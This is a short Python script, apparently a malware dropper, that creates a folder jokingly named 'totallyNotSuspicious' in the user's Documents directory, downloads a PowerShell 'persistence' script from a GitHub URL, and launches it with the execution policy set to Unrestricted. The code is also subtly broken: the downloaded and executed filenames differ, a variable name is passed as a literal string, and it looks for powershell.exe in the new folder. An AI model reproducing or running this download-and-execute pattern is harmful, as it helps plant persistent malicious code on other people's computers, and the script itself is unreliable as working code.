import subprocess
from pathlib import Path
import wget
import os
cwd=os.path.join(Path.home(),"Documents","totallyNotSuspicious")
os.mkdir(cwd)
os.chdir(cwd)
wget.download('https://raw.githubusercontent.com/Acrasy/samples/master/codesamples/initialize/code/persitence.ps1')

excuteF=os.path.join(cwd,"powershell.exe")
psexectaskscheduler = subprocess.Popen([r'executF','-ExecutionPolicy','Unrestricted','./persistence.ps1'])
